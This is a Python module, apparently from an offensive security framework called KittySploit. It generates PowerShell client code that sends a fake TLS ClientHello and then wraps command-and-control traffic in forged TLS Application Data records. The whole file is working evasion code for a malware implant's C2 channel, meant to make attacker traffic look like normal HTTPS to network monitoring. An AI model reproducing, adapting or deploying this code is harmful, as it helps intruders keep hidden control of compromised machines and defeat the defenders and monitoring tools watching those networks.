#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Optional
from modules.obfuscators.python.protocol.https_mimic import (
    CLIENT_HELLO_BYTES,
    Module as PythonHttpsObfuscator,
)


class Module(PythonHttpsObfuscator):
    """PowerShell HTTPS/TLS record mimic obfuscator."""

    SUPPORTED_CLIENT_LANGUAGES = ["powershell"]

    __info__ = {
        "name": "PowerShell HTTPS Mimic Obfuscator",
        "description": "Sends a fake TLS ClientHello then wraps C2 bytes in TLS Application Data records.",
        "author": "KittySploit Team",
        "version": "1.0.0",
    }

    def generate_client_code(self, language: str) -> Optional[str]:
        if language != "powershell":
            return None
        hello_values = ",".join(str(b) for b in CLIENT_HELLO_BYTES)
        return (
            f"$script:obfClientHello=[byte[]]({hello_values});\n"
            "$script:obfBuf=New-Object System.Collections.Generic.List[byte];$script:obfFirst=$true;\n"
            "function _obf_encode([byte[]]$d){\n"
            " if($null -eq $d -or $d.Length -eq 0){return [byte[]]@()}\n"
            " $out=New-Object System.Collections.Generic.List[byte]\n"
            " if($script:obfFirst){$out.AddRange($script:obfClientHello);$script:obfFirst=$false}\n"
            " $i=0\n"
            " while($i -lt $d.Length){$n=[Math]::Min(16384,$d.Length-$i);$c=New-Object byte[] $n;[Array]::Copy($d,$i,$c,0,$n);$i+=$n;$out.Add(0x17);$out.Add(0x03);$out.Add(0x03);$out.Add(($n -shr 8) -band 255);$out.Add($n -band 255);$out.AddRange($c)}\n"
            " return $out.ToArray()\n"
            "}\n"
            "function _obf_decode([byte[]]$d){\n"
            " if($null -ne $d -and $d.Length -gt 0){$script:obfBuf.AddRange($d)}\n"
            " $out=New-Object System.Collections.Generic.List[byte]\n"
            " while($script:obfBuf.Count -ge 5){\n"
            "  $rt=$script:obfBuf[0];$ln=($script:obfBuf[3] -shl 8) -bor $script:obfBuf[4]\n"
            "  if($ln -gt 16384){$script:obfBuf.RemoveAt(0);continue}\n"
            "  if($script:obfBuf.Count -lt 5+$ln){break}\n"
            "  if($rt -eq 0x17){$out.AddRange($script:obfBuf.GetRange(5,$ln).ToArray())}\n"
            "  $script:obfBuf.RemoveRange(0,5+$ln)\n"
            " }\n"
            " return $out.ToArray()\n"
            "}\n"
        )
